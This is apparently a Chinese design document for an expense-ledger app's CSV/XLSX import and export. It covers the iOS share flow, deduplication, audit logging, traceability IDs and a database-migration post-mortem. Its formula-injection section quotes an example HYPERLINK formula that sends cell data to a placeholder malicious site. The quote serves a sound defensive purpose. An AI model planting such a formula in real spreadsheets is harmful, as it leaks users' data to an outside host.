## 二、iOS 的导出体验（所有者第 1 条要求）

> 所有者原话：**"在苹果手机上下载一个东西跟分享一个东西本质上没什么区别"**。

| 平台 | 做法 |
|---|---|
| **支持 Web Share API 且能分享文件**（iPhone Safari 等） | 调 **原生分享菜单** —— 用户可选「存储到文件」、AirDrop、发给他 App |
| **不支持**（桌面浏览器、部分安卓浏览器等） | **普通文件下载** |

**实现纪律**：

1. **必须检测能力，不能假设**：`navigator.canShare?.({ files: [...] })` 为真才走分享 ✓
2. **分享失败要能回退**：用户取消分享不是错误；**分享 API 抛异常时要退回下载**，不能什么都不发生 ✓
3. **两种路径都要给用户明确的完成反馈**，不能分享了却什么都不显示 ✓

## 三、⚠️ CSV / XLSX 公式注入（所有者第 3 条要求）

**这是安全问题，不是格式问题。**

**攻击方式**：如果备注里写了 `=HYPERLINK("http://恶意站/?x="&A1, "点我")`，
导出的文件被 Excel 打开时**会被当作公式执行** ✗ 可以外泄数据、或诱导点击。

**必须以 `'` 前缀（或等效方式）转义所有以这些字符开头的单元格**：

```
=   +   -   @   Tab(0x09)   CR(0x0D)
```

**适用字段**：**一切用户可控的文本** —— 备注、分类名、支付方式名、标签名、账本名 ✓

**同时**：数值列要保持**真正的数字类型**（XLSX 里不能变成文本，否则求和失效）✗
—— 所以**转义只作用于文本列**，不能一刀切 ✓

**测试必须覆盖**：每个危险字符开头的备注，导出后**不带前缀时仍是纯文本** ✓

## 四、⚠️ 导入判重的作用域（所有者第 4 条要求）

> 所有者原话：**"不要直接把外部文件中的 UUID 无条件当作新流水主键"**。

### 错误做法（两种）

| 做法 | 为什么错 |
|---|---|
| 拿文件里的 UUID **当新流水的 `id`** | 外部文件的主键**不受我们控制**，可能与其他账本/其他用户冲突，也可能被伪造 ✗ |
| 只按 UUID **全局判重** | 用户把同一份文件导入**另一个账本**时，会被**错误跳过** ✗ |

### 正确做法

| 项 | 设计 |
|---|---|
| **新流水的主键** | **我们自己生成**（客户端 UUID v7，与现有录入路径一致）✓ |
| **文件里的 UUID** | 存进一个**单独的列**，例如 `source_ref`（来源引用），**仅作参考** ✓ |
| **唯一约束** | `@@unique([bookId, sourceRef])` —— **作用域是账本** ✓✓ |
| 效果一 | **同一文件重复导入同一账本 → 幂等，不产生重复** ✓ |
| 效果二 | **同一文件导入另一个账本 → 正常写入，不会被跳过** ✓ |
| 文件里**没有** UUID（外部来源的 CSV） | `source_ref` 存 `null` ✓ 此时**不做判重**，按新流水写入 ✓（并提示用户可能存在重复） |

> **一句话**：**判重是"这个账本里有没有这条来源记录"，不是"这个 UUID 存不存在"。**

**✅ 已落地（2026-10-10）**：`source_ref` 列与 `@@unique([bookId, sourceRef])` 已在 schema 和迁移里；
文件里带不带唯一值、以及"我们自己导出的文件又导回来"时怎么认出来，见 §8。

## 五、导出审计：只记"发生过什么"，不记"内容"（所有者第 5 条要求）

> 所有者原话：**"只保存必要的审计信息，不保存完整导出文件或流水内容"**。

**记**：谁、何时、导出范围（月份区间 / 收支 / 分类 / 币种）、**条数**、**格式**、**文件编号**
**不记**：导出的每一条流水、文件内容、文件本体 ✓

**文件编号**：`fileRef`，**用户可见**，格式最终定为 **`Out-20261010-153012-a3f9`** ——
这样日后用户说"我某天导出的那个文件有问题"时，**能对上是哪一次** ✓
（导入用同一套规则，前缀换成 `In-`；完整格式与理由见 §8。）

**用途**：账目数据外流需要可追溯（这个应用是给别人用的，不是玩具）✓

## 六、服务端资源控制（所有者第 2 条要求）

**问题**：导出若一次性把全部交易读进内存，账目增长后会有内存风险 ✓

**先给结论**：单条流水的字段很少（十几个），
**一万条约几 MB**，一次性读取**对现在的量级没有实际负担** ✓

**但仍然要设上限**，原因不是现在，是**以后** ✓

| 措施 | 说明 |
|---|---|
| **导出条数上限** | 超过上限时**明确告知用户**，并建议按月份/分类分批导出，**而不是静默截断** ✗ |
| **分批读取** | 用**游标分批**（复用列表接口的分页机制）写入输出流，而不是 `findMany()` 一次取全 ✓ |
| **文件大小** | 与条数上限等价，**不单独设**（字段固定，条数即大小）✓ |

> **原则**：**宁可让用户分批导出，也不要让服务器因为一次点击而吃满内存** ✓
> 而且**绝不静默截断** —— 用户以为导全了、实际少了一半，比报错糟得多 ✗

## 八、可追溯编号：In- 与 Out-（2026-10-10 定稿）

> **所有者的要求**："导入和导出都附带一个唯一值，并且这个值最好能够说明它是导入的，还是导出的。
> ……我希望这整个项目要极其清晰，然后其中的数据都是可以追溯的。"

### 格式

```
Out-20261010-153012-a3f9     离开这本账（导出时生成）
In-20261010-153012-b7c2      进入这本账（导入时生成）
│   │        │      └── 4 位随机十六进制：同一秒内两次操作不会撞号
│   │        └── HHMMSS，**UTC**
│   └── YYYYMMDD，**UTC**
└── 方向：Out = 离开，In = 进入 —— **一眼就能看出数据往哪个方向走**
```

| 项 | 决定 | 理由 |
|---|---|---|
| **长度** | `Out-` 24 字符 / `In-` 23 字符 | 列是 `VARCHAR(32)`，留出余量；长度本身也是校验点 |
| **时间用 UTC** | 是 | 这个时间戳**不是权威时间**（权威时间是日志表的 `created_at`，界面显示的是它）。用 UTC 保证**同一份文件在世界上任何服务器上生成的编号都一致**，而用户会把这个编号保存很多年 |
| **格式由谁保证** | **数据库 CHECK 约束**，不只是代码 | "追不到的编号根本写不进去"——包括日期范围（月份 01–12、日 01–31、时分秒合法），`20261399` 这种**看起来像日期但不是**的值同样写不进去 |
| **大小写** | 只允许小写十六进制 | 大写会破坏"格式唯一"，CHECK 会拒绝 |

### 四条链路，逐条可追溯

| 数据 | 带什么编号 | 存在哪 |
|---|---|---|
| **导出** | 一个 `Out-` 编号 | 写进 `export_logs.file_ref`（唯一），**并写进导出文件的每一行** |
| **导入** | 一个 `In-` 编号 | 写进 `import_logs.file_ref`（唯一），**并写进这批每一笔流水的 `import_ref`** |
| **文件里的行值** | 该行在文件里的唯一值 | 写进流水 `source_ref`，**账本内唯一** `@@unique([bookId, sourceRef])` |
| **手工录入** | 无 | `import_ref` 与 `source_ref` 都是 `null`——**"没有来源"本身也是可读的信息** |

### 导入时的三种情形（判重规则）

| 文件里那一行 | 处理 |
|---|---|
| 带 **我们自己的 `Out-` 编号**（也就是这份文件是我们导出的） | 记进 `import_logs.exported_file_ref`，于是界面能说"这是 10 月 10 日你导出的那份文件"，而不是猜 |
| 带的唯一值**这个账本里已经有** | **跳过，并计入 `skipped_count`** —— 这是判重生效，不是错误，但必须**可计数** |
| 什么唯一值都没有（外部来源的 CSV） | `source_ref` 存 `null`，**不做判重**，按新流水写入，并**提示用户可能存在重复** |

> **一句话**：**判重是"这个账本里有没有这条来源记录"，不是"这个 UUID 存不存在"。**
> 新流水的主键**永远由我们自己生成**（客户端 UUID v7，与现有录入路径一致）——文件里来的值**只作参考**。

### 导出同时要记的审计（只记"发生过什么"）

**记**：谁、何时、范围（月份 / 收支 / 分类 / 币种）、**条数**、**格式**、**`Out-` 编号**
**不记**：导出的每一条流水、文件内容、文件本体 ✓
**导入**额外记：文件字节的 SHA-256（`source_fingerprint`，用来回答"这个文件我是不是已经导过"而不用留着文件）、
`row_count` / `imported_count` / `skipped_count`（**"文件里 200 行、账本只多了 187 笔"必须答得出来**）。

## 九、第 1 步的中途状态（2026-10-10 收尾记录）——**已解决**

> ⚠️ **本节保留的原因**：下面这次事故的**每一个细节以后还会遇到**，尤其是"回退代码时忘了数据库那边"。
> 事故已修复，修复过程写在最后。

### 当时发生了什么

| 顺序 | 结果 |
|---|---|
| 1 | 往 `prisma/schema.prisma` 加了 `Transaction.sourceRef`、`@@unique([bookId, sourceRef])`、`ExportLog` 模型 |
| 2 | `prisma validate` 通过 ✓ |
| 3 | **`prisma migrate dev` 不能用** —— 它需要交互终端 ✗ |
| 4 | 改为手写迁移 SQL + `prisma migrate deploy` → **迁移成功应用** ✓ |
| 5 | **但 API 测试挂了 11 / 14**（创建流水返回 500）✗ |
| 6 | **回退 schema 与迁移文件 → 66 个 API 测试重新全绿** ✓ |

### 第 5 步的真正原因（2026-10-10 查清）

**不是 schema 的问题。** 当时的判断"是 schema 改动导致的"是**错的**——正确的解释是：

> **那个迁移只应用到了 `ledger_dev`，而集成测试跑在 `ledger_test` 上。**
> `ledger_test` 从来没有 `source_ref` 这一列；Prisma Client 按新 schema 生成后，
> 每次插入都会带上这个列 → **每条 INSERT 都 500**。测试挂掉与 schema 内容无关。

**决定性证据**：这次把迁移**同时应用**到两个库之后，同一套 schema 改动（还多加了 `import_ref`、
`import_logs`、账本内唯一约束）→ **66 个 API 测试全绿**。

**由此得到的纪律（比结论本身更重要）**：

1. **改了 schema 就要问一句"另一个库怎么办"**——开发库与测试库是两个数据库，测试只证明测试库。
2. **迁移文件与数据库是一对**：回退代码时如果删掉迁移文件、却留着数据库里已应用的记录，
   下次迁移就**无法诚实地前进**（详见下一小节）。
3. **一次只改一处**依然是对的，但**排查方向要先看"环境差异"，再看"改动内容"**——
   这次如果在 `ledger_test` 上先跑一次 `migrate status`，五分钟就能定位，而不是回退整个改动。

### 数据库曾经领先于 schema（已修复）

回退时删掉了迁移文件，**但 `ledger_dev` 里那条已应用的记录留了下来**，于是：

- `transactions.source_ref` 列、`(book_id, source_ref)` 唯一索引、`export_logs` 表**在库里存在**
- 而 `schema.prisma` 与迁移目录里**都没有**它们 → 出现"**目录已不存在的迁移**"

**修复方式（可复用）**：

| 步 | 做法 |
|---|---|
| 1 | 把被删掉的那个迁移**按应用时的原样重建**（字节一致），因为它的校验和已经被记录，**改一个字都会让所有既有库失去可复现性** |
| 2 | 新增一个**诚实的第二个迁移**，只加它没有的东西（`import_ref`、账本内唯一约束、`import_logs`、格式 CHECK） |
| 3 | `ledger_dev` 的那两个手工对象**确认是空的**（0 行）后删掉，**从迁移重放**，让库与迁移历史重新一致 |
| 4 | 在**全新库**上从零跑完 11 个迁移，与 `ledger_dev` / `ledger_test` 逐项对比：**表、约束、迁移历史三者完全一致** |

> **为什么不是"直接改库对齐"**：因为要先想清楚**哪边是想要的**。
> 这里想要的是"迁移文件能重放出一模一样的库"，所以选择**让库服从迁移**，而不是让迁移迁就库。

### 环境上的两个坑（下次直接用）

1. **schema 在仓库根目录** `prisma/schema.prisma`，**不在 `apps/api` 下** ✗
   所以 `pnpm --filter @libellum/api exec prisma ...` **会跑错目录** ✓
   正确写法：在仓库根目录跑 `node_modules\.bin\prisma.cmd <cmd>`（或 `pnpm exec prisma`）✓

2. **`prisma migrate dev` 在本环境不可用**（需要交互终端）✗
   **改用**：手写 `migration.sql` → `prisma migrate deploy` ✓
   （或 `prisma migrate diff --from-config-datasource --to-schema prisma/schema.prisma --script` 生成 SQL；
   **Prisma 7 里 `--from-url` 已被移除**，只能用 `--from-config-datasource`，靠环境变量 `DATABASE_URL` 切换目标库）✓

3. **`migrate diff` 的输出不要用 PowerShell 管道写文件** ✗
   验证时把 PowerShell 自己的报错和 BOM 一起写进了 `migration.sql`，
   导致 PostgreSQL 报语法错误、迁移进入失败状态 ✓
   **改用 Python 或编辑工具写文件** ✓（`docs/README.md` 里已经有一条同源的教训）

4. **本机的 `psql` 不认识连接串里的 `?schema=public`** ✗（`invalid URI query parameter`）
   手动查库时先把它去掉：`$url -split '\?' | Select-Object -First 1` ✓

## 十、导出文件的列（第 3 步实现时照这个来）

中文表头、UTF-8 BOM、金额按币种小数位格式化。**每一行都带两个可追溯的值**：

| 列 | 内容 | 说明 |
|---|---|---|
| 日期 | `occurred_local_date` | 记账时手机的本地日期，**不是服务器时区算出来的** |
| 时间 | `occurred_at` 的本地部分 | 精确到秒 |
| 时区 | `occurred_tz` | IANA，如 `Asia/Shanghai` |
| 类型 | 支出 / 收入 | |
| 金额 | 按币种小数位 | **必须是数值型**（XLSX 里不能变成文本，否则求和失效） |
| 币种 | ISO 4217 | |
| 分类 | 名称 | |
| 支付方式 | 名称 | |
| 备注 | 原样 | ⚠️ **公式注入转义**只作用于这一类文本列 |
| 标签 | 逗号分隔 | |
| 录入时间 | `created_at` | |
| **流水编号** | `transactions.id` | 我们自己生成的 UUID v7 —— **导入时用它判"这笔我是不是已经有了"** |
| **来源编号** | `source_ref` | 外部文件里的唯一值；手工录入的为空 |
| **导出编号** | `Out-…` | **整份文件同一个值**，导入时据此认出"这是我们的文件" |

> **模板下载**给的是同样的表头，但**不含最后三列**——外部来源本来就没有这些值。
